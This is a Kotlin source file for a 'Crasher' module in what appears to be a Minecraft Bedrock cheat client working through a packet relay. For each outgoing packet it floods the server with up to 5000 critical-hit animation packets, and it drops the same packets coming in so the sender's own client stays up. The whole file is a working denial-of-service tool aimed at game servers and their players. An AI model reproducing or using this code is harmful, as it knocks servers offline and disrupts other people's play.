package dev.sora.relay.cheat.module.impl.misc

import dev.sora.relay.cheat.module.CheatCategory
import dev.sora.relay.cheat.module.CheatModule
import dev.sora.relay.game.event.EventPacketInbound
import dev.sora.relay.game.event.EventPacketOutbound
import org.cloudburstmc.protocol.bedrock.packet.AnimatePacket

class ModuleCrasher : CheatModule("Crasher", CheatCategory.MISC) {
	private var levelValue by intValue("Level", 1000, 10..5000)

	private val onPacketOutbound = handle<EventPacketOutbound> {
		repeat(levelValue){
			session.sendPacket(AnimatePacket().apply {
				runtimeEntityId = session.player.runtimeEntityId
				action = AnimatePacket.Action.CRITICAL_HIT
			})
		}
	}

	private val onPacketInbound = handle<EventPacketInbound> {
		if(packet is AnimatePacket){
			if(packet.action == AnimatePacket.Action.CRITICAL_HIT){
				cancel()
			}
		}
	}
}

